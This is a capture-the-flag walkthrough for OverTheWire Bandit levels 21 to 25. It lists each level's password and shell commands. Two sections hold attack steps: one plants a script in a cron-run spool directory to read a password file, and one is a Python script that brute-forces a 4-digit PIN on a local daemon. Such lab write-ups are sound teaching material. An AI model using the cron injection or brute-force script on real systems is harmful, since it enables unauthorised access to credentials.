# OverTheWire Bandit: Level 21 → Level 25 Walkthrough

## Level 21 → Level 22

### Password: `EeoULMCra2q0dSkYj561DX7s1CpBuOBt`

### Goal:
A program is running at regular intervals using cron. Find the cron job for bandit22 and understand what command is being executed.

### Steps:
1. Go to the cron job configuration directory:
   ```bash
   cd /etc/cron.d/
   ```

2. View the cron file related to bandit22:
   ```bash
   cat cronjob_bandit22
   ```

3. This will show the command being executed on behalf of bandit22.

4. Investigate the script it runs:
   ```bash
   cat /usr/bin/cronjob_bandit22.sh
   ```

5. The script outputs the password to a file. Read the file:
   ```bash
   cat /tmp/<filename>
   ```

6. This will reveal the password for bandit22:
   ```bash
   tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
   ```

---

## Level 22 → Level 23

### Password: `tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q`

### Goal:
Another cron job is running, and you must analyze the script it executes.

### Steps:
1. Go to the cron directory:
   ```bash
   cd /etc/cron.d/
   ```

2. View the file `cronjob_bandit23`:
   ```bash
   cat cronjob_bandit23
   ```

3. Identify the script being run, e.g.:
   ```bash
   @reboot bandit23 /usr/bin/cronjob_bandit23.sh
   ```

4. View that script:
   ```bash
   cat /usr/bin/cronjob_bandit23.sh
   ```

5. The script should reveal where the password for bandit23 is written.

6. Read that file:
   ```bash
   cat /tmp/<filename>
   ```

7. You'll find the password:
   ```bash
   0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
   ```

---

## Level 23 → Level 24

### Password: `0Zf11ioIjMVN551jX3CmStKLYqjk54Ga`

### Goal:
A cron job is running a script that executes files from a specific folder. You'll need to write your own script to extract the password.

### Steps:
1. View the cron job:
   ```bash
   cat /etc/cron.d/cronjob_bandit24
   ```

2. Identify the script:
   ```bash
   /usr/bin/cronjob_bandit24.sh
   ```

3. This script runs all executable files in `/var/spool/bandit24/`.

4. Create your own script:
   ```bash
   echo "cat /etc/bandit_pass/bandit24 > /tmp/mybandit24pass" > /tmp/myscript.sh
   chmod +x /tmp/myscript.sh
   cp /tmp/myscript.sh /var/spool/bandit24/
   ```

5. Wait for a minute and then check:
   ```bash
   cat /tmp/mybandit24pass
   ```

6. Password retrieved:
   ```bash
   gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
   ```

---

## Level 24 → Level 25

### Password: `gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`

### Goal:
A daemon running on port 30002 requires the password for bandit24 along with a 4-digit PIN. You must brute-force the correct PIN.

### Steps:
1. Write a Python script to test all PINs:

   ```python
   import socket

   host = "localhost"
   port = 30002
   password = "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"

   s = socket.socket()
   s.connect((host, port))

   for pin in range(10000):
       pin_str = str(pin).zfill(4)
       s.sendall(f"{password} {pin_str}\n".encode())
       result = s.recv(1024).decode()
       if "Wrong" not in result:
           print("[+] Found PIN:", pin_str)
           print("[+] Output:", result)
           break

   s.close()
   ```

2. Run the script to retrieve the password:
   ```bash
   iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
   ```

---

